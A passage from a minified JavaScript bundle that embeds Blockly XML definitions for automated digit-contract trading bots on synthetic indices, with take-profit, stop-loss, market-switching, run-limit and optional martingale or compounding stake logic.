id="f;YaY;efEV^HkE4fJgY/">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="#=u;*~XqDVf(6j+LY9ZD">\n            <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n          </block>\n        </value>\n      </block>\n    </statement>\n  </block>\n  <block type="after_purchase" id="N|p|#TF(n)T5q(2;:E_L" collapsed="true" x="723" y="60">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="controls_if" id="z;c[K$OpqdAjU*wCLl*9">\n        <mutation elseif="1" else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="NHjJbm[Cijv~Ley/ZvIr">\n            <field name="OP">GTE</field>\n            <value name="A">\n              <block type="total_profit" id="mmY6mRJMyW:XJT7y-BUk"></block>\n            </value>\n            <value name="B">\n              <block type="variables_get" id="Qu^BJ/f~0@mXd]Vf[#2w">\n                <field name="VAR" id="iexW!(p-QSL[kDvWK`o-" variabletype="">Take Profit</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="text_print" id="N(zlzQ$brWJvN0,0xxB5">\n            <value name="TEXT">\n              <shadow type="text" id="@eqR_i-,.3g]~5e/`t~F">\n                <field name="TEXT">Take Profit Hit</field>\n              </shadow>\n            </value>\n          </block>\n        </statement>\n        <value name="IF1">\n          <block type="logic_compare" id="gU^da0)!38=fPrv[Rz3T">\n            <field name="OP">LTE</field>\n            <value name="A">\n              <block type="total_profit" id="#Ns63Q/r5HW*!La^07U-"></block>\n            </value>\n            <value name="B">\n              <block type="math_single" id="y)htA1wy)WnQ,7:f(MkN">\n                <field name="OP">NEG</field>\n                <value name="NUM">\n                  <shadow type="math_number" id="z8}-_]UDkc8rkuzJ(ckC">\n                    <field name="NUM">9</field>\n                  </shadow>\n                  <block type="variables_get" id="[F8%a@pBeA2Ks[Q=.Vik">\n                    <field name="VAR" id="AwGIX3K`=6@AOl/-`G)O" variabletype="">Stop Loss</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO1">\n          <block type="text_print" id="5|so};ejYw%-A{s=d5;Q">\n            <value name="TEXT">\n              <shadow type="text" id=")01HACF%x-bW*#tiNBaS">\n                <field name="TEXT">Sorry Stop Loss Hit</field>\n              </shadow>\n            </value>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="controls_if" id="(~~!1CBdadAhV8aPYMI0">\n            <mutation else="1"></mutation>\n            <value name="IF0">\n              <block type="contract_check_result" id="RQXD%_pE6|`{LQdh#sXt">\n                <field name="CHECK_RESULT">win</field>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="controls_if" id="Q]sDr;9JG{H)-ToA^qY~">\n                <mutation else="1"></mutation>\n                <value name="IF0">\n                  <block type="logic_compare" id="Otu})/^2I447Lz#Gl!@x">\n                    <field name="OP">EQ</field>\n                    <value name="A">\n                      <block type="variables_get" id="vq/fe]aLJ?~c$iTVGk:C">\n                        <field name="VAR" id="XfX?ed24Y,S7*f=/-sQ9" variabletype="">Use Compounding Stake</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <block type="logic_boolean" id="Os;:HiTE!t[W+95efnm8">\n                        <field name="BOOL">TRUE</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO0">\n                  <block type="variables_set" id="7e?n4,h^^XpkHK2*~qys">\n                    <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                    <value name="VALUE">\n                      <block type="math_arithmetic" id="+lEu!Mk(/aY$$3]R,T`K">\n                        <field name="OP">ADD</field>\n                        <value name="A">\n                          <shadow type="math_number" id="8LRw%u*$6]uTRIx-_v6Q">\n                            <field name="NUM">1</field>\n                          </shadow>\n                          <block type="variables_get" id="Lp/b}~57af;EnN3#q03`">\n                            <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <shadow type="math_number" id="R{jE2;vqUWD~Q.%.U6uW">\n                            <field name="NUM">1</field>\n                          </shadow>\n                          <block type="read_details" id="-Qmkyk)(J?GgEH|M!!q1">\n                            <field name="DETAIL_INDEX">4</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                  </block>\n                </statement>\n                <statement name="ELSE">\n                  <block type="variables_set" id=":d=G)ngwmIw:im?a~_j?">\n                    <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id="WuZqGT[Un!|3spaue(6r">\n                        <field name="VAR" id="!(67Y!ov*~[U/$pjZ,0." variabletype="">Stake win</field>\n                      </block>\n                    </value>\n                  </block>\n                </statement>\n              </block>\n            </statement>\n            <statement name="ELSE">\n              <block type="controls_if" id="+?8Z.DfA=Zet`YxX%8si">\n                <mutation else="1"></mutation>\n                <value name="IF0">\n                  <block type="logic_compare" id="@b50qr+`dDSTwoa_IiU$">\n                    <field name="OP">EQ</field>\n                    <value name="A">\n                      <block type="variables_get" id="j$X0.fVQu`k{T#M#NV8I">\n                        <field name="VAR" id="_$b#PTe$SH2iW}Unna2W" variabletype="">Use Martingale</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <block type="logic_boolean" id="zq+?6}?-v},jig5LeUqv">\n                        <field name="BOOL">TRUE</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO0">\n                  <block type="variables_set" id="hpGUBN@n:%puMqtwr^^=">\n                    <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                    <value name="VALUE">\n                      <block type="math_arithmetic" id="}sk@_ouH)[3;j?BLBb7b">\n                        <field name="OP">MULTIPLY</field>\n                        <value name="A">\n                          <shadow type="math_number" id="sAa/m#%`t/-:kVi9US8g">\n                            <field name="NUM">1</field>\n                          </shadow>\n                          <block type="variables_get" id="7^v$f#:k9p+Jd!!pLVmr">\n                            <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <shadow type="math_number" id="ew#0r(._R^PpJ27dlBJr">\n                            <field name="NUM">2</field>\n                          </shadow>\n                          <block type="variables_get" id="b7$Pw$~A(vYSJ?Q3*;HM">\n                            <field name="VAR" id="Z@.ow_sBjxwtbL$F52.u" variabletype="">Martingale</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                  </block>\n                </statement>\n                <statement name="ELSE">\n                  <block type="variables_set" id="=k*Rc`VF=muad@A{I(_F">\n                    <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id="wucnM!}{i+P:SW(}shM~">\n                        <field name="VAR" id="!(67Y!ov*~[U/$pjZ,0." variabletype="">Stake win</field>\n                      </block>\n                    </value>\n                  </block>\n                </statement>\n              </block>\n            </statement>\n            <next>\n              <block type="controls_if" id="[XO8vgpdRseYHZobdCOM">\n                <mutation else="1"></mutation>\n                <value name="IF0">\n                  <block type="logic_operation" id="YWcR/)!4.G{8`pOVO:,B">\n                    <field name="OP">AND</field>\n                    <value name="A">\n                      <block type="contract_check_result" id="-Rt6U:%!B!;d1gPOcZ2.">\n                        <field name="CHECK_RESULT">win</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <block type="logic_compare" id="J(_rV]j$,?_`aFZ7nxIK">\n                        <field name="OP">GTE</field>\n                        <value name="A">\n                          <block type="total_runs" id="#Th68@lC4BC?ZaA9qYa-"></block>\n                        </value>\n                        <value name="B">\n                          <block type="variables_get" id="nkk#!9O{f3StWbhJOuUU">\n                            <field name="VAR" id="tpKgmnH0mz*.t/T=*i|V" variabletype="">Maximum Runs</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO0">\n                  <block type="text_print" id="8UU,gOiZQ]@Jel)ujU)i" collapsed="true">\n                    <value name="TEXT">\n                      <shadow type="text" id="%gcuk7CSH/#@?{z5t5P{">\n                        <field name="TEXT">Maximum Run Hit!!!  ||  Don\'t Over Trade. Stupid</field>\n                      </shadow>\n                    </value>\n                  </block>\n                </statement>\n                <statement name="ELSE">\n                  <block type="trade_again" id="#KJVl$qm:K_P8;R%i0rj"></block>\n                </statement>\n              </block>\n            </next>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="before_purchase" id="V/jf;#b@;*@3ATM]D)=;" deletable="false" x="0" y="1140">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="procedures_callnoreturn" id="W]/99p4AY6,$8SPFGlj@">\n        <mutation name="Switch Markets"></mutation>\n        <data>FrhP.v@2:JZ=^x?jnS$%</data>\n        <next>\n          <block type="text_join" id="D={8du*d/_2-6kHbCktj" collapsed="true">\n            <field name="VARIABLE" id="Qq28jzu{61V^?3_DKY1z" variabletype="">text</field>\n            <statement name="STACK">\n              <block type="text_statement" id="[T:T(wc/J!yu,^99{.hB">\n                <value name="TEXT">\n                  <shadow type="text" id="t5L]]NVSx!UgB8Fql_@#">\n                    <field name="TEXT">Entry Point: </field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="text_statement" id="Z*_3,y[9+[CCCXM7f9UY">\n                    <value name="TEXT">\n                      <shadow type="text" id="Bi68;O7h4u%iSSNm]`Ak">\n                        <field name="TEXT"></field>\n                      </shadow>\n                      <block type="variables_get" id="m0p.oR_e-hkjyugJJw._">\n                        <field name="VAR" id="}4sS3G-ig-*lgLxN.HK~" variabletype="">Entry Point</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="text_statement" id="mr4N-tHpNGkAZ(f:zZ;!">\n                        <value name="TEXT">\n                          <shadow type="text" id=";:|~IbP#!TbXSbFE^|iD">\n                            <field name="TEXT">{</field>\n                          </shadow>\n                        </value>\n                        <next>\n                          <block type="text_statement" id="HN*sLdw}#)(t#cZ;jFAH">\n                            <value name="TEXT">\n                              <shadow type="text" id="}9ulm=y607lniFm]OTG2">\n                                <field name="TEXT"></field>\n                              </shadow>\n                              <block type="last_digit" id="0!/zDZx?Xq@o{EHs`?v1"></block>\n                            </value>\n                            <next>\n                              <block type="text_statement" id="uh3w_8kaSn)P4h!v1dG_">\n                                <value name="TEXT">\n                                  <shadow type="text" id="PyqLSP]-(g,T*4yw/vtS">\n                                    <field name="TEXT">}</field>\n                                  </shadow>\n                                </value>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="btnotify" id="497Bq58BVf9+Zlb.xcYL" collapsed="true">\n                <field name="NOTIFICATION_TYPE">success</field>\n                <field name="NOTIFICATION_SOUND">silent</field>\n                <value name="MESSAGE">\n                  <shadow type="text" id="/sPTQBozr114}mtSN*9I">\n                    <field name="TEXT">PrimeTrades</field>\n                  </shadow>\n                  <block type="variables_get" id="s7Xq7nGw{OyA1)tD`x2q">\n                    <field name="VAR" id="Qq28jzu{61V^?3_DKY1z" variabletype="">text</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="btnotify" id="-SP}Fsj;VS{Vk[GagAWn" collapsed="true">\n                    <field name="NOTIFICATION_TYPE">info</field>\n                    <field name="NOTIFICATION_SOUND">silent</field>\n                    <value name="MESSAGE">\n                      <shadow type="text" id="yw$U|2n8Gf8-:q#q_G/j">\n                        <field name="TEXT">\uD83C\uDF84\uD83C\uDF81 Christmas Gift By Binarytool \uD83C\uDF81\uD83C\uDF84</field>\n                      </shadow>\n                    </value>\n                    <next>\n                      <block type="apollo_purchase" id="ZIu(a,2Hj/!q4UzZ%=8_">\n                        <field name="PURCHASE_LIST">DIGITEVEN</field>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n  <block type="procedures_defnoreturn" id=":Tq]VUlM=BJk#=;.3aYU" collapsed="true" x="0" y="1516">\n    <field name="NAME">Prevent Over Trading</field>\n    <statement name="STACK">\n      <block type="controls_if" id="hw=cT/cCl+J0)lT-lieP">\n        <value name="IF0">\n          <block type="logic_compare" id=",:0WEpD-U?+dK}3Q/}sl">\n            <field name="OP">EQ</field>\n            <value name="A">\n              <block type="variables_get" id="F9!pA:tc?{?=$.^O[e{9">\n                <field name="VAR" id=":,%~KY@s+t4t[x%D|Rs`" variabletype="">Set Maximum Runs</field>\n              </block>\n            </value>\n            <value name="B">\n              <block type="logic_boolean" id="50Dv6P9X0=L]tRV/}{#`">\n                <field name="BOOL">TRUE</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="variables_set" id="^$ZZ[~UuPdsc%*9amek!">\n            <field name="VAR" id="tpKgmnH0mz*.t/T=*i|V" variabletype="">Maximum Runs</field>\n            <value name="VALUE">\n              <block type="text_prompt_ext" id="%1Dfmh2=LNu,Q,^FC^tX">\n                <field name="TYPE">NUMBER</field>\n                <value name="TEXT">\n                  <shadow type="text" id="W|I![6p5zg4*ooTjlFo.">\n                    <field name="TEXT">abc</field>\n                  </shadow>\n                  <block type="text" id="U./mgz-v!VgWHMpaWA$f">\n                    <field name="TEXT">MAXIMUM NO. OF RUNS PER SESSION  [3-5 RECOMMENDED]</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="procedures_defnoreturn" id="FrhP.v@2:JZ=^x?jnS$%" collapsed="true" x="0" y="1612">\n    <field name="NAME">Switch Markets</field>\n    <statement name="STACK">\n      <block type="controls_if" id="VGZPogGY0Set{6_anb^G">\n        <value name="IF0">\n          <block type="variables_get" id="*Q:5xM72M0uH1c4n)z`m">\n            <field name="VAR" id="@VN/)JBDaz5d-aHKEiy:" variabletype="">Switch Markets</field>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="controls_if" id="Ki6kTyGNE=5#A}+Gg,03">\n            <mutation elseif="9"></mutation>\n            <value name="IF0">\n              <block type="logic_compare" id=")RN1:VOnXI9Vk6.4roIe">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="T!R:J2x!dxRo]dj}O8(;">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="^E=;m#1KAneN`S:G:2CS">\n                    <field name="NUM">0</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="active_symbol_changer" id="-ZxS^B8T}|,HpOC%(Q{b">\n                <field name="SYMBOL_ACTIVE_TYPE">disable</field>\n                <next>\n                  <block type="math_change" id="P}x0(E:6`/|(_Ea|xuO^">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                    <value name="DELTA">\n                      <shadow type="math_number" id="Kepl7mFD7Q+~%.k~f4{5">\n                        <field name="NUM">1</field>\n                      </shadow>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF1">\n              <block type="logic_compare" id="m5vX2MyIr4aZ2Z_SfSZZ">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="~D0j-xolT?r3DAkm@[yF">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="mfil0y+(%k2~t|-?3EaY">\n                    <field name="NUM">1</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO1">\n              <block type="math_change" id="JKDEDg;Ys7Y^UlZgyr`L">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="h=g9/nQ(=[M:tSxL{|Ee">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="NqArOhvF`dZYzINFUsKx">\n                    <field name="SYMBOL_ACTIVE_TYPE">R_10</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF2">\n              <block type="logic_compare" id="5gT$!er~9CHL:IAap[Bl">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="^BT`2{m!}J^tc~Q,CJb9">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="?VFC]H}/sT/Ox}+1AzNn">\n                    <field name="NUM">2</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO2">\n              <block type="math_change" id="?hsN1hTjE#p#5U@@dARD">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="t+/l~tS0c56_.v+{6ve:">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="T%SI$7#V|!--$bT@Mv9D">\n                    <field name="SYMBOL_ACTIVE_TYPE">1HZ25V</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF3">\n              <block type="logic_compare" id=":/zVQoL2!_bjTeDx[LR6">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="$+4bF,x2VOu(Z~h$9wHx">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id=":T.32sK|]}^Q1?f#;5?W">\n                    <field name="NUM">3</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO3">\n              <block type="math_change" id="*s9r4kZgmsshX/`~7il.">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="tt4#*_)2#g8Fe!i#FJq^">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="~BuR4g0t@I)aUy?+F?6f">\n                    <field name="SYMBOL_ACTIVE_TYPE">R_25</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF4">\n              <block type="logic_compare" id="_c[I7*nq^TaqO|=F1sS|">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="BsT9ufUY=6Z`()~JYK_E">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="ktQ-AOll^a3oeOzKl[n-">\n                    <field name="NUM">4</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO4">\n              <block type="math_change" id="S5T^9^i[t$ui78zpcXhX">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="L~y-nLlv]J0%#!@cu9lG">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="d;UjX}NZt|ZI?o`dj(2M">\n                    <field name="SYMBOL_ACTIVE_TYPE">1HZ50V</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF5">\n              <block type="logic_compare" id="(}%3CM*e%tc~Ws0)6S7X">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="[`P4=vqTD90T2;{b:3QX">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="tN^-(Ge,0B[/%5ul,3ml">\n                    <field name="NUM">5</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO5">\n              <block type="math_change" id="EgKJ*IuoZ+^%XeHuBS%s">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="DaE|Q#[}}Dliwpg;gcBa">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="0]U;{fm=H3gkmj[I4UBt">\n                    <field name="SYMBOL_ACTIVE_TYPE">R_50</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF6">\n              <block type="logic_compare" id="ft{li;Mhn|D[PhJ!s~?5">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="5m*T?)fR*MmV$zp)VVM8">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="OTg-f}eGcCi7LC3TY7if">\n                    <field name="NUM">6</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO6">\n              <block type="math_change" id="e)P?$);8NQ08|,zw?L$2">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="DK8;=cbwYTU!`:j8@oCx">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id=":o|g$E2[oc*-SnoE6j5v">\n                    <field name="SYMBOL_ACTIVE_TYPE">1HZ75V</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF7">\n              <block type="logic_compare" id="|*cb5uT?#D/4qX9rwfOU">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="YQq|Mo=WtahBh%Z5;LQ^">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="%BMHyxCJHIqKc:Qav1SD">\n                    <field name="NUM">7</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO7">\n              <block type="math_change" id="(xi?s#+N:[Jnbp8ne~-q">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="M%l{m?_]xV1l*4x}F5}H">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="uUE8bKj!o!^IEOUpsq].">\n                    <field name="SYMBOL_ACTIVE_TYPE">R_75</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF8">\n              <block type="logic_compare" id="^560qRq.HiF9s~qY-0J|">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="}RGyHH-OOT#Aj!g|6Jv1">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="+rWG01YI]k`6a+*y*Rq[">\n                    <field name="NUM">8</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO8">\n              <block type="math_change" id="?VTZTO?K~$j~=DoY*)h9">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="%oBAmNX:4b,g}jqhZQlR">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="JDlwY!|41d%Y%@iV|GWx">\n                    <field name="SYMBOL_ACTIVE_TYPE">1HZ100V</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF9">\n              <block type="logic_compare" id="jr#1JwW4oZQy7gj.07jU">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="L1mLq.=%V369lY^EOgdz">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="bOfynK:1K#@4R(r*2PkT">\n                    <field name="NUM">9</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO9">\n              <block type="active_symbol_changer" id="GE6Cz/eu?nKq(;!dgtvt">\n                <field name="SYMBOL_ACTIVE_TYPE">R_100</field>\n                <next>\n                  <block type="variables_set" id="6|am|{Qan=}eJ4%WGqBc">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="e+T*@qF]C)8m^d[%!=4)">\n                        <field name="NUM">0</field>\n                      </block>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </statement>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n</xml>'
            },
            99194: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="http://www.w3.org/1999/xhtml" is_dbot="true" collection="false">\n  <variables>\n    <variable type="" id="QY=*3W:IirW]Cfm]YaSZ" islocal="false" iscloud="false">Contract Detail Profit</variable>\n    <variable type="" id="W4$:ZQCmEz#8+=4ysv5Y" islocal="false" iscloud="false">STOP LOSS</variable>\n    <variable type="" id="*~^il,R2A~%s$tI!hmw1" islocal="false" iscloud="false">Next Trade Condition</variable>\n    <variable type="" id="mXtFswo{p,|%W1:V-$+r" islocal="false" iscloud="false">TARGET PROFIT</variable>\n    <variable type="" id="2%L3Rjj4.RqsTSPla6hf" islocal="false" iscloud="false">Loss Count</variable>\n    <variable type="" id="0UL{mRzO/~$S[(7*t)fz" islocal="false" iscloud="false">text</variable>\n    <variable type="" id="K3m#S.:R~K*DlNt9p-Ph" islocal="false" iscloud="false">text2</variable>\n    <variable type="" id="j}8O`Vs+RJljIwPu-_:_" islocal="false" iscloud="false">YOUR STAKE</variable>\n    <variable type="" id="r;j5hdLRm`b6LFCDue7-" islocal="false" iscloud="false">SET YOUR MARTINGALE</variable>\n    <variable type="" id="xkyECO0^diB!A_fJs1-." islocal="false" iscloud="false">text1</variable>\n    <variable type="" id="Ee@Y|9KoB74OGfm~dVo6" islocal="false" iscloud="false">text3</variable>\n    <variable type="" id="Nu45/qB+9Ke$!A8Y%N|a" islocal="false" iscloud="false">Ops!Sl hit</variable>\n    <variable type="" id="Eujnw%N@9L.H.r),7#zV" islocal="false" iscloud="false">Tp hitted</variable>\n    <variable type="" id="%L?;380E6Lr^3b.%}t5Q" islocal="false" iscloud="false">Win Amount</variable>\n  </variables>\n  <block type="trade_definition" id="30EO99h(j,/(KI;Z3{X;" deletable="false" x="0" y="60">\n    <statement name="TRADE_OPTIONS">\n      <block type="trade_definition_market" id="Iu1F|x@g}dTAv{`Xj2Wn" deletable="false" movable="false">\n        <field name="MARKET_LIST">synthetic_index</field>\n        <field name="SUBMARKET_LIST">random_index</field>\n        <field name="SYMBOL_LIST">R_100</field>\n        <next>\n          <block type="trade_definition_tradetype" id="gt`_kai*J-0Js/?CJ]H:" deletable="false" movable="false">\n            <field name="TRADETYPECAT_LIST">digits</field>\n            <field name="TRADETYPE_LIST">overunder</field>\n            <next>\n              <block type="trade_definition_contracttype" id="Wm{l1EBJW44={8,_1ypU" deletable="false" movable="false">\n                <field name="TYPE_LIST">DIGITUNDER</field>\n                <next>\n                  <block type="trade_definition_candleinterval" id="gbB8IP-HtcZFg7PiH`(f" deletable="false" movable="false">\n                    <field name="CANDLEINTERVAL_LIST">60</field>\n                    <next>\n                      <block type="trade_definition_restartbuysell" id="2hg_4:@njL={7Dr3v/e5" deletable="false" movable="false">\n                        <field name="TIME_MACHINE_ENABLED">FALSE</field>\n                        <next>\n                          <block type="trade_definition_restartonerror" id="iUxMfoIEUc,;uxE`(BTb" deletable="false" movable="false">\n                            <field name="RESTARTONERROR">TRUE</field>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="INITIALIZATION">\n      <block type="text_print" id="1!$nMDzUl^NWG4x2~tvC">\n        <value name="TEXT">\n          <shadow type="text" id="/^Ou!_f55p8VU6MW;,,Z">\n            <field name="TEXT">MKOREAN SV5 BOT</field>\n          </shadow>\n        </value>\n        <next>\n          <block type="variables_set" id="~R^@fi5/{:KJ6{%W#E.1">\n            <field name="VAR" id="W4$:ZQCmEz#8+=4ysv5Y" variabletype="">STOP LOSS</field>\n            <value name="VALUE">\n              <block type="text" id=",1~yGGg4*D[%z)9hWKX3">\n                <field name="TEXT">500</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="dvgGt))ls-!P|#h9rJfm">\n                <field name="VAR" id="mXtFswo{p,|%W1:V-$+r" variabletype="">TARGET PROFIT</field>\n                <value name="VALUE">\n                  <block type="math_number" id="/pDO0P^CIPIeoa.#B.nz">\n                    <field name="NUM">500</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="NZoK(LAk?)~cR(yW6^^3">\n                    <field name="VAR" id="j}8O`Vs+RJljIwPu-_:_" variabletype="">YOUR STAKE</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="(Ci_dxJ$a%DIASm!9k~@">\n                        <field name="NUM">1</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id=".EJeohC$d77x-SGa+]Ds">\n                        <field name="VAR" id="r;j5hdLRm`b6LFCDue7-" variabletype="">SET YOUR MARTINGALE</field>\n                        <value name="VALUE">\n                          <block type="math_number" id="*XBy)Y;GFk)(;(4B90+p">\n                            <field name="NUM">2</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="8j#+;q?b^WuGh,A5A:q0">\n                            <field name="VAR" id="%L?;380E6Lr^3b.%}t5Q" variabletype="">Win Amount</field>\n                            <value name="VALUE">\n                              <block type="variables_get" 